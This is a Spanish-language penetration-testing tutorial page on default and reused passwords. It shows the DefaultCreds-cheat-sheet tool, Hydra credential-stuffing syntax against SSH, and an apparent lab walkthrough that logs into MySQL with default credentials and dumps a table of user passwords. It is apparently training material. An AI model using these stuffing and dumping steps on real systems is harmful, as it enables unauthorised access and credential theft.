
# Contraseñas por defecto

## <mark style="color:purple;">Reutilización de contraseñas / contraseñas predeterminadas</mark>

***

Es común que tanto los usuarios como los administradores dejen los valores predeterminados. Los administradores deben realizar un seguimiento de toda la tecnología, la infraestructura y las aplicaciones junto con los datos a los que se accede. En este caso, `el mismo password` se suele utilizar con fines de configuración, y luego se olvida la contraseña para cambiarla por una interfaz u otra. Además, muchas aplicaciones que funcionan con mecanismos de autenticación, básicamente casi todas, suelen venir con `credenciales por defecto` después de la instalación. Es posible que se olvide cambiar estas credenciales predeterminadas después de la configuración, especialmente cuando se trata de aplicaciones internas donde los administradores asumen que nadie más las encontrará y ni siquiera intentan usarlas.

Además, las contraseñas fáciles de recordar que se pueden escribir rápidamente en lugar de escribir contraseñas de 15 caracteres a menudo se usan repetidamente porque el [inicio de sesión único](https://en.wikipedia.org/wiki/Single_sign-on) ( `SSO`) no siempre está disponible inmediatamente durante la instalación inicial y la configuración en redes internas requiere mucho tiempo. cambios. Al configurar redes, a veces trabajamos con infraestructuras enormes (dependiendo del tamaño de la empresa) que pueden tener cientos de interfaces. A menudo, se pasa por alto un dispositivo de red, como un enrutador, una impresora o un firewall, y se utilizan `credenciales por defecto` , o lo mismo `password is reused`.

***

## <mark style="color:purple;">Credential Stuffing</mark>

Existen varias bases de datos que mantienen una lista actualizada de credenciales predeterminadas conocidas. Uno de ellos es [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)

{% embed url="<https://github.com/ihebski/DefaultCreds-cheat-sheet>" %}

### Instalación y uso

```bash
pip3 install defaultcreds-cheat-sheet
creds search tomcat
```

```bash
# Search for product creds
➤ creds search tomcat                                                                                                      
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat (web)              |   tomcat   |   tomcat   |
| apache tomcat (web)              |   admin    |   admin    |
...
+----------------------------------+------------+------------+

# Update records
➤ creds update
Check for new updates...🔍
New updates are available 🚧
[+] Download database...

# Export Creds to files (could be used for brute force attacks)
➤ creds search tomcat export
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat (web)              |   tomcat   |   tomcat   |
| apache tomcat (web)              |   admin    |   admin    |
...
+----------------------------------+------------+------------+

[+] Creds saved to /tmp/tomcat-usernames.txt , /tmp/tomcat-passwords.txt 📥
```

Las credenciales predeterminadas también se pueden encontrar en la documentación del producto, ya que contienen los pasos necesarios para configurar el servicio correctamente. Algunos dispositivos/aplicaciones requieren que el usuario configure una contraseña durante la instalación, pero otros usan una contraseña débil predeterminada. Atacar esos servicios con las credenciales predeterminadas u obtenidas se llama [Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) . Esta es una variante simplificada de la fuerza bruta porque sólo se utilizan nombres de usuario compuestos y las contraseñas asociadas.

Podemos imaginar que hemos encontrado algunas aplicaciones utilizadas en la red por nuestros clientes. Después de buscar en Internet las credenciales predeterminadas, podemos crear una nueva lista que separe estas credenciales compuestas con dos puntos ( `username:password`). Además, podremos seleccionar las contraseñas y mutarlas según nuestras `rules` para aumentar la probabilidad de aciertos.

### <mark style="color:purple;">**Credential Stuffing: sintaxis de Hydra**</mark>

```shell-session
afsh4ck@kali$ hydra -C <user_pass.list> <protocol>://<IP>
```

### <mark style="color:purple;">**Credential Stuffing - Hydra**</mark>

```shell-session
afsh4ck@kali$ hydra -C user_pass.list ssh://10.129.42.197

...
```

Aquí OSINT juega otro papel importante. Debido a que OSINT nos da una "sensación" de cómo están estructuradas la empresa y su infraestructura, entenderemos qué contraseñas y nombres de usuario podemos combinar. Luego podemos almacenarlos en nuestras listas y usarlos después. Además, podemos utilizar Google para ver si las aplicaciones que encontramos tienen credenciales codificadas que se pueden utilizar.

### <mark style="color:purple;">**Búsqueda de Google: Credenciales predeterminadas**</mark>

<figure><img src="/files/MFPFqAGnSPrBwDrCsOsn" alt=""><figcaption></figcaption></figure>

Además de las credenciales predeterminadas para aplicaciones, algunas listas las ofrecen para enrutadores. Una de estas listas se puede encontrar [aquí](https://www.softwaretestinghelp.com/default-router-username-and-password-list/) . Es mucho menos probable que las credenciales predeterminadas de los enrutadores no se modifiquen. Dado que estas son las interfaces centrales de las redes, los administradores suelen prestar mucha más atención a reforzarlas. Sin embargo, todavía es posible que se pase por alto un enrutador o que actualmente solo se utilice en la red interna con fines de prueba, lo que luego podemos aprovechar para futuros ataques.

***

## <mark style="color:purple;">Caso práctico</mark>

Utilice las credenciales de usuario que encontramos en la sección anterior y descubra las credenciales para MySQL.

### Default Creds Cheatsheet

Vamos a empezar buscando credenciales por defecto en mysql con el siguiente programa:

{% embed url="<https://github.com/ihebski/DefaultCreds-cheat-sheet>" %}

```bash
creds search mysql           
+---------------------+-------------------+----------+
| Product             |      username     | password |
+---------------------+-------------------+----------+
| mysql               | admin@example.com |  admin   |
| mysql               |        root       | <blank>  |
| mysql (ssh)         |        root       |   root   |
| mysql               |      superdba     |  admin   |
| scrutinizer (mysql) |    scrutremote    |  admin   |
+---------------------+-------------------+----------+
```

### Conexión a MySQL

Probando una a una, encontramos que funciona la siguiente: `superdba:admin`, por lo que nos conectamos a mysql desde el servidor SSH:

```sql
sam@nix01:~/smb$ mysql -u superdba -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

No entry for terminal type "xterm-kitty";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

Accedemos a la base de datos correctamente y empezamos a enumerar información

```sql
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.00 sec)

mysql> USE users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
+-----------------+
| Tables_in_users |
+-----------------+
| creds           |
+-----------------+
1 row in set (0.00 sec)

mysql> SELECT * FROM creds;
+-----+--------------------+-------------+
| id  | name               | password    |
+-----+--------------------+-------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX |
|   2 | Shelley Levy       | GOK34QLM1DT |
|   3 | Uriel Velez        | OAY05YXS1XN |
|   4 | Vanna Benton       | EAU86WAY1BY |
|   5 | Philip Morales     | ONC53GFI2ID |
|   6 | Joshua Morgan      | AHJ46CDW4LH |
|   7 | Hadley Hanson      | YVD16TIY3QI |
|   8 | Branden Moses      | ZBE71RLJ5HN |
|   9 | Pandora Sears      | WYP33WEF5GY |
|  10 | Orla Lambert       | MLZ15XKR8SF |
|  11 | Maite Moran        | FOS06OOU2DF |
|  12 | Cassandra Mccarthy | SIB53CEH5DE |
|  13 | Leroy Sullivan     | HIC68RBH5EI |
|  14 | Wyoming Quinn      | LJM77SJC6BN |
|  15 | Asher Wise         | HHP00OHN8OD |
<---- SNIP ---->
+-----+--------------------+-------------+
```
